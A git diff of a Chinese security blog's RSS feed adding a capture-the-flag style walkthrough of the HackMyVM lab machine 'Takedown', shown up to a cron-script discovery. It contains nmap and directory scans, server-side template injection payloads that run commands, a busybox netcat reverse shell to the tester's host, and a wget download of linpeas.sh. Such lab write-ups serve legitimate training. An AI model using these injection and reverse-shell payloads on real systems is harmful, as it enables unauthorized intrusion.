@@ -1,5 +1,156 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Pingsag3 Blog</title><link>https://pingsag3.github.io</link><description>萍水相逢，恰似温柔~</description><copyright>Pingsag3 Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg</url><title>avatar</title><link>https://pingsag3.github.io</link></image><lastBuildDate>Sat, 09 Aug 2025 08:48:28 +0000</lastBuildDate><managingEditor>Pingsag3 Blog</managingEditor><ttl>60</ttl><webMaster>Pingsag3 Blog</webMaster><item><title>群友靶机：Base 20250723</title><link>https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9ABase%2020250723.html</link><description>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Pingsag3 Blog</title><link>https://pingsag3.github.io</link><description>萍水相逢，恰似温柔~</description><copyright>Pingsag3 Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg</url><title>avatar</title><link>https://pingsag3.github.io</link></image><lastBuildDate>Sat, 09 Aug 2025 08:52:46 +0000</lastBuildDate><managingEditor>Pingsag3 Blog</managingEditor><ttl>60</ttl><webMaster>Pingsag3 Blog</webMaster><item><title>hackmyvm Takedown测试记录</title><link>https://pingsag3.github.io/post/hackmyvm%20Takedown-ce-shi-ji-lu.html</link><description>
+### 1. 基本信息
+
+```
+靶机链接：
+https://maze-sec.com/library
+https://hackmyvm.eu/machines/machine.php?vm=Takedown
+```
+
+```shell
+难度：⭐️⭐️⭐️⭐️
+知识点：信息收集，目录扫描，SSTI，`linpeas.sh`脚本，`RSA`工具及密钥处理脚本，`Contempt`提权
+```
+
+### 2. 信息收集
+
+##### Nmap
+
+```shell
+└─# arp-scan -l | grep PCS
+192.168.31.116  08:00:27:b1:55:96       PCS Systemtechnik GmbH
+└─# IP=192.168.31.116
+└─# nmap -sV -sC -A $IP -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 09:12 CST
+Nmap scan report for osiris (192.168.31.116)
+Host is up (0.0018s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
+| ssh-hostkey:
+|   3072 51:fb:66:e0:d2:b6:ae:16:a9:d2:74:41:a5:b3:02:2b (RSA)
+|   256 93:a0:01:6c:42:cd:26:bf:38:e5:70:fb:b8:c6:b3:fe (ECDSA)
+|_  256 77:c9:ed:41:a5:cb:30:33:08:22:88:f6:a8:28:11:8d (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://shieldweb.che/
+|_http-server-header: nginx/1.18.0
+MAC Address: 08:00:27:B1:55:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+开放了`22、80`端口,先常规扫一下目录
+
+```shell
+└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html,.bak
+└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
+
+```
+
+访问`80`端口无内容，直接访问有个301跳转 `http://shieldweb.che/` ,加入域名到`/etc/hosts`,进入页面`http://shieldweb.che/`，点击`Contact`按钮又跳转了`http://ticket.shieldweb.che/`,继续加入域名到`/etc/hosts`
+
+```shell
+└─# curl  http://$IP -v
+*   Trying 192.168.31.116:80...
+* Connected to 192.168.31.116 (192.168.31.116) port 80
+* using HTTP/1.x
+&gt; GET / HTTP/1.1
+&gt; Host: 192.168.31.116
+&gt; User-Agent: curl/8.11.0
+&gt; Accept: */*
+&gt;
+* Request completely sent off
+&lt; HTTP/1.1 301 Moved Permanently
+&lt; Server: nginx/1.18.0
+&lt; Date: Sat, 09 Aug 2025 01:22:39 GMT
+&lt; Content-Type: text/html
+&lt; Content-Length: 169
+&lt; Connection: keep-alive
+&lt; Location: http://shieldweb.che/
+&lt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+* Connection #0 to host 192.168.31.116 left intact
+└─# cat /etc/hosts | grep .che
+192.168.31.116  shieldweb.che ticket.shieldweb.che
+```
+
+### 3.获得`docker`权限
+
+测试`Contact`页面存在`SSTI`模板注入
+
+![image-20250809101436919](https://gitee.com/shui666/images/raw/master/images/image-20250809101436919.png)
+
+去`github`找个现成方案测试`PayloadsAllTheThings
+/Server Side Template Injection/Python.md`
+
+```shell
+#https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+Thank you for your message, uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) !
+#注意，没得bash，用ash
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.31.126 1234 -e /bin/ash').read() }}
+└─# nc -lvp 1234
+listening on [any] 1234 ...
+id
+connect to [192.168.31.126] from ticket.shieldweb.che [192.168.31.116] 52914
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+
+美化一下终端，受限于`doker`环境，这里使用`Python`的`pty`模块生成一个伪终端，而不能直接用系统自带的工具`script`升级终端
+
+```shell
+#1.把反弹shell变成交互式，在接受回弹的nc -lvp 4444终端上执行
+python -c 'import pty; pty.spawn('/bin/ash')'
+先ctrl + Z 中断再输入
+#2.交互式shell变成支持回退字符的shell（支持控制字符）
+stty raw -echo;fg
+#reset，这一条弄了当前终端只能强制关闭
+#xterm#根据默认xterm查询，命令echo  $SHELL、echo  $TERM
+3.终端vi可全屏编辑，解决输入问题
+stty -a#查询当前尺寸
+stty rows 24 columns 120#根据上面查询结果，设置为当前窗口大小
+```
+
+
+
+### 4.获得`love`权限
+
+没扒拉到东西，先取个`linpeas.sh`脚本扫一下
+
+```shell
+kali└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.31.116 - - [09/Aug/2025 10:48:03] 'GET /linpeas.sh HTTP/1.1' 200 -
+
+/tmp # wget 192.168.31.126/linpeas.sh
+Connecting to 192.168.31.126 (192.168.31.126:80)
+linpeas.sh           100% |************************************************************************|  808k  0:00:00 ETA
+/tmp # chmod +x linpeas.sh
+/tmp # ./linpeas.sh
+```
+
+通过`linpeas.sh`脚本发现可疑目录挂载：将`/love/script`目录挂载到了`/script`（看群主的WP才知道）
+
+```
+╔══════════╣ Interesting Files Mounted
+239 231 0:23 /love/script /script rw,nosuid,nodev - tmpfs tmpfs rw
+240 231 8:1 /home/alfonso/.local/share/docker/containers/45df5690b1c3614e3cd25bbb3d5c0fad58e549016c0bca12e3f421e3b1fc1c70/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
+241 231 8:1 /home/alfonso/.local/share/docker/containers/45df5690b1c3614e3cd25bbb3d5c0fad58e549016c0bca12e3f421e3b1fc1c70/hostname /etc/hostname rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
+242 231 8:1 /home/alfonso/.local/share/docker/containers/45df5690b1c3614e3cd25bbb3d5c0fad58e549016c0bca12e3f421e3b1fc1c70/hosts /etc/hosts rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
+244 233 0:5 /random /dev/random rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755
+245 233 0:5 /full /dev/full rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755
+246 233 0:5 /tty /dev/tty rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755
+247 233 0:5 /zero /dev/zero rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755
+248 233 0:5 /urandom /dev/urandom rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755
+
+```
+
+结合`/var/log`下`access.yml、chat`中内容，知道每`5分钟`执行了`cron`任务，任务路径是`/home/love/script`，前面已知`/love/script`目录被挂载到了`/script`。</description><guid isPermaLink="true">https://pingsag3.github.io/post/hackmyvm%20Takedown-ce-shi-ji-lu.html</guid><pubDate>Sat, 09 Aug 2025 08:52:18 +0000</pubDate></item><item><title>群友靶机：Base 20250723</title><link>https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9ABase%2020250723.html</link><description>
 ### 1. 基本信息
 
 ```
